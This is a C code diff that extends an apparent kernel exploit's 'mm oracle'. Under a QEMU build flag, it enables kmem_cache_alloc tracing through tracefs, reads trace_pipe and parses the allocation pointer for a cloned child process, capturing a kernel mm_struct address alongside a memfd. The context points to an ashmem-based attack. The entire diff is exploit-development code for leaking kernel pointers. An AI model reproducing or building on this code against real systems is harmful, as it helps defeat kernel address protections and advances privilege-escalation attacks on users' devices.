@@ -790,36 +790,115 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
 }
 
 #if defined(QEMU_MM_TRACE_ORACLE)
+#define QEMU_MM_TRACEFS_ROOT "/sys/kernel/tracing"
+
 static int qemu_mm_trace_fd = -1;
+static int qemu_mm_trace_owned = 0;
+
+static int qemu_mm_trace_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t written = write(fd, value, len);
+  close(fd);
+  return written == (ssize_t)len;
+}
 
 static int qemu_mm_trace_ready(void) {
   if (qemu_mm_trace_fd >= 0) {
     return 1;
   }
-  const char *value = getenv("QEMU_MM_TRACE_FD");
-  char *end = NULL;
-  long parsed;
 
-  if (!value || !*value) {
-    pr_error("qemu mm trace fd missing\n");
+  const char *value = getenv("QEMU_MM_TRACE_FD");
+  if (value && *value) {
+    char *end = NULL;
+    errno = 0;
+    long parsed = strtol(value, &end, 10);
+    if (errno || end == value || *end || parsed < 0 ||
+        parsed > INT_MAX || fcntl((int)parsed, F_GETFD) < 0) {
+      pr_error("qemu mm trace fd invalid value=%s errno=%d\n", value, errno);
+      return 0;
+    }
+
+    qemu_mm_trace_fd = (int)parsed;
+    int flags = fcntl(qemu_mm_trace_fd, F_GETFL, 0);
+    if (flags < 0 ||
+        fcntl(qemu_mm_trace_fd, F_SETFL, flags | O_NONBLOCK) < 0) {
+      pr_error("qemu mm trace fd nonblock failed fd=%d errno=%d\n",
+               qemu_mm_trace_fd, errno);
+      qemu_mm_trace_fd = -1;
+      return 0;
+    }
+    pr_info("qemu mm trace source=inherited fd=%d\n", qemu_mm_trace_fd);
+    return 1;
+  }
+
+  char trace_pipe[128];
+  char trace[128];
+  char event_enable[160];
+  char tracing_on[128];
+
+  snprintf(trace_pipe, sizeof(trace_pipe),
+           QEMU_MM_TRACEFS_ROOT "/trace_pipe");
+  snprintf(trace, sizeof(trace), QEMU_MM_TRACEFS_ROOT "/trace");
+  snprintf(event_enable, sizeof(event_enable),
+           QEMU_MM_TRACEFS_ROOT "/events/kmem/kmem_cache_alloc/enable");
+  snprintf(tracing_on, sizeof(tracing_on),
+           QEMU_MM_TRACEFS_ROOT "/tracing_on");
+
+  if (!qemu_mm_trace_write(tracing_on, "0")) {
+    pr_error("qemu mm trace setup: tracing_off failed errno=%d\n", errno);
     return 0;
   }
-  errno = 0;
-  parsed = strtol(value, &end, 10);
-  if (errno || end == value || *end || parsed < 0 ||
-      fcntl((int)parsed, F_GETFD) < 0) {
-    pr_error("qemu mm trace fd invalid value=%s errno=%d\n", value, errno);
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd < 0) {
+    pr_error("qemu mm trace setup: trace clear failed errno=%d\n", errno);
     return 0;
   }
-  qemu_mm_trace_fd = (int)parsed;
-  int flags = fcntl(qemu_mm_trace_fd, F_GETFL, 0);
-  if (flags < 0 || fcntl(qemu_mm_trace_fd, F_SETFL, flags | O_NONBLOCK) < 0) {
-    pr_error("qemu mm trace fd nonblock failed fd=%d errno=%d\n",
-             qemu_mm_trace_fd, errno);
+  close(trace_fd);
+
+  qemu_mm_trace_fd = open(trace_pipe, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+  if (qemu_mm_trace_fd < 0) {
+    pr_error("qemu mm trace setup: trace_pipe open failed errno=%d\n", errno);
+    return 0;
+  }
+
+  if (!qemu_mm_trace_write(event_enable, "1") ||
+      !qemu_mm_trace_write(tracing_on, "1")) {
+    pr_error("qemu mm trace setup failed errno=%d\n", errno);
+    close(qemu_mm_trace_fd);
     qemu_mm_trace_fd = -1;
     return 0;
   }
+
+  qemu_mm_trace_owned = 1;
+  pr_info("qemu mm trace source=self trace_pipe fd=%d event=kmem_cache_alloc\n",
+          qemu_mm_trace_fd);
   return 1;
+}
+
+static void qemu_mm_trace_stop(void) {
+  if (!qemu_mm_trace_owned) {
+    return;
+  }
+
+  char tracing_on[128];
+  char event_enable[160];
+  snprintf(tracing_on, sizeof(tracing_on),
+           QEMU_MM_TRACEFS_ROOT "/tracing_on");
+  snprintf(event_enable, sizeof(event_enable),
+           QEMU_MM_TRACEFS_ROOT "/events/kmem/kmem_cache_alloc/enable");
+  qemu_mm_trace_write(tracing_on, "0");
+  qemu_mm_trace_write(event_enable, "0");
+
+  if (qemu_mm_trace_fd >= 0) {
+    close(qemu_mm_trace_fd);
+  }
+  qemu_mm_trace_fd = -1;
+  qemu_mm_trace_owned = 0;
 }
 
 static int qemu_mm_trace_drain(void) {
@@ -841,11 +920,11 @@ static int qemu_mm_trace_drain(void) {
   }
 }
 
-static int qemu_mm_trace_read(uintptr_t *mm_out) {
+static int qemu_mm_trace_read(pid_t target_pid, uintptr_t *mm_out) {
   char data[16384];
   char pid_token[32];
 
-  snprintf(pid_token, sizeof(pid_token), "-%d ", getpid());
+  snprintf(pid_token, sizeof(pid_token), "-%d ", target_pid);
   for (size_t retry = 0; retry < 200; ++retry) {
     ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data) - 1);
     if (size < 0) {
@@ -860,6 +939,7 @@ static int qemu_mm_trace_read(uintptr_t *mm_out) {
       usleep(1000);
       continue;
     }
+
     data[size] = 0;
     char *line = data;
     while (line && *line) {
@@ -867,6 +947,7 @@ static int qemu_mm_trace_read(uintptr_t *mm_out) {
       if (next) {
         *next++ = 0;
       }
+
       char *event = strstr(line, "kmem_cache_alloc:");
       char *ptr = event ? strstr(event, " ptr=") : NULL;
       int mm_callsite = event &&
@@ -882,10 +963,12 @@ static int qemu_mm_trace_read(uintptr_t *mm_out) {
       line = next;
     }
   }
-  pr_error("qemu mm trace missed pid=%d\n", getpid());
+
+  pr_error("qemu mm trace missed pid=%d\n", target_pid);
   return 0;
 }
 #endif
+
 
 
 pid_t clone_child(void) {
@@ -909,6 +992,7 @@ int qemu_mm_oracle_leak(uintptr_t *mm_out, int *memfd_out) {
   int fd;
 
   if (!mm_out || !memfd_out || !qemu_mm_trace_drain()) {
+    qemu_mm_trace_stop();
     return 0;
   }
   *mm_out = 0;
@@ -916,12 +1000,14 @@ int qemu_mm_oracle_leak(uintptr_t *mm_out, int *memfd_out) {
 
   child = clone_child();
   fd = open_memfd(child);
-  if (!qemu_mm_trace_read(mm_out)) {
+  if (!qemu_mm_trace_read(child, mm_out)) {
     close(fd);
     kill_child(child);
+    qemu_mm_trace_stop();
     return 0;
   }
   kill_child(child);
+  qemu_mm_trace_stop();
   *memfd_out = fd;
   pr_info("qemu mm oracle captured mm=%016zx memfd=%d pid=%d\n",
           *mm_out, fd, getpid());
